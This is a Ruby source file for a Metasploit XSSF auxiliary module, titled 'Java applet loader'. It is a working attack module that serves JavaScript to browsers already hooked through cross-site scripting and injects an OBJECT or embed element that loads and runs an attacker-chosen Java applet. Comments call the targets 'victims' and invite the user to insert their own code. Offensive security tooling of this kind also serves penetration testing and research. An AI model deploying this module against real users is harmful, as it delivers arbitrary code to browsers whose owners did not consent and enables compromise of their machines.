require 'msf/core'
require 'msf/base/xssf'

#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Loads a java applet and runs it on victims browser
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Java applet loader',
			'Description' => 'Loads a java applet and runs it on victims browser'
		))
		
		register_options(
			[
				OptString.new('JarName', [false, "Name of the jar to load (if there is a .jar, without .jar, included in '#{Msf::Xssf::INCLUDED_FILES}')"]),
				OptString.new('ClassName', [true, "Name of the class to load (without .class, included in '#{Msf::Xssf::INCLUDED_FILES}')", 'WireframeViewer']),
				OptInt.new('AppletWidth', [true, 'Width of the applet on web page', 300]),
				OptInt.new('AppletHeight', [true, 'Height of the applet on web page', 300])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{ 
			<html><body><script>
			var _app = navigator.appName; 
		}
		
		if (datastore['JarName'])
			code << %Q{
				if (_app == 'Microsoft Internet Explorer') {
					elt = document.createElement('div');
					elt.innerHTML = "<OBJECT classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' width='#{datastore['AppletWidth']}' height='#{datastore['AppletHeight']}'> <PARAM name='code' value='#{datastore['ClassName']}'><PARAM name='archive' value='/#{datastore['JarName']}.jar'></OBJECT>";
				} else {
					elt = document.createElement('embed');
					elt.setAttribute('code','#{datastore['ClassName']}.class');
					elt.setAttribute('width','#{datastore['AppletWidth']}');
					elt.setAttribute('height','#{datastore['AppletHeight']}');
					elt.setAttribute('archive','/#{datastore['JarName']}.jar');
					elt.setAttribute('type','application/x-java-applet;version=1.6');
				}
			}
		else
			code << %Q{
				if (_app == 'Microsoft Internet Explorer') {
					elt = document.createElement('div');
					elt.innerHTML = "<OBJECT classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' width='#{datastore['AppletWidth']}' height='#{datastore['AppletHeight']}'> <PARAM name='code' value='/#{datastore['ClassName']}'></OBJECT>";
				} else {
					elt = document.createElement('embed');
					elt.setAttribute('code','/#{datastore['ClassName']}.class');
					elt.setAttribute('width','#{datastore['AppletWidth']}');
					elt.setAttribute('height','#{datastore['AppletHeight']}');
					elt.setAttribute('type','application/x-java-applet;version=1.6');
				}
			}
		end
		
		code << %Q{	document.body.appendChild(elt);	</script></body></html>}

		send_response(cli, code)
	end
end